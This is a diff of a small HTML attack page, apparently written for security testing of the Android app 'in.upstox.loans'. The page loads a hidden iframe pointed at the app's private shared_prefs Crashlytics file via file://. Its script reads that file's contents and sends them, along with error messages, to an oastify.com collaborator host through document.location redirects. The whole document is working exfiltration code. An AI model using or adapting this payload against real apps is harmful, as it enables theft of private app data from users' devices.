@@ -1,22 +1,19 @@
 <html><body>
+<iframe id="f" src="file:///data/data/in.upstox.loans/shared_prefs/com.google.firebase.crashlytics.xml" style="display:none"></iframe>
 <script>
-var iframe = document.createElement('iframe');
-iframe.src = 'file:///data/data/in.upstox.loans/shared_prefs/com.google.firebase.crashlytics.xml';
-iframe.onload = function() {
-  try {
-    var data = iframe.contentDocument.documentElement.outerHTML;
-    document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/lfi_exfil?data=" + encodeURIComponent(data);
-  } catch(e) {
-    document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/lfi_error?msg=" + encodeURIComponent(e.message);
-  }
-};
-iframe.onerror = function() {
-  document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/iframe_error";
-};
-document.body.appendChild(iframe);
-// Fallback timeout
 setTimeout(function() {
-  document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/timeout";
-}, 5000);
+  try {
+    var data = document.getElementById('f').contentDocument.documentElement.outerHTML;
+    document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/lfi_success?data=" + encodeURIComponent(data);
+  } catch(e) {
+    // Try contentWindow
+    try {
+      var data2 = document.getElementById('f').contentWindow.document.documentElement.outerHTML;
+      document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/lfi_success2?data=" + encodeURIComponent(data2);
+    } catch(e2) {
+      document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/lfi_blocked?err1=" + encodeURIComponent(e.message) + "&err2=" + encodeURIComponent(e2.message);
+    }
+  }
+}, 2000);
 </script>
 </body></html>
